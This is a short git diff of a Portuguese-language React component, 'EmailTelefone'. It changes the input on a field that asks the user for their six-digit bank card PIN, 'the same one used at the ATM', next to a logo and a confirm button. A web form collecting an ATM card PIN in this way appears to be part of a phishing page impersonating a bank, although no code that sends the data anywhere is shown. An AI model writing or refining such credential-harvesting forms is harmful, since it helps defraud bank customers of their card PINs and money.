@@ -35,6 +35,7 @@ const EmailTelefone = () => {
         }, 1000);
     };
 
+
     return (
         <div className='EmailTelefone'>
             <div className='logo'>
@@ -55,12 +56,12 @@ const EmailTelefone = () => {
                 />
                 <span>a mesma que você usa no caixa eletrônico (6 digitos):</span>
                 <InputMask
-                    mask="999999"
                     className="digitavel"
                     type="password"
                     placeholder='digite a senha do cartão'
                     onChange={defineSeis}
                     aria-label="senha do cartão"
+                    maxLength={6}
                 />
                 <button onClick={handleClick}>confirmar</button>
             </div>
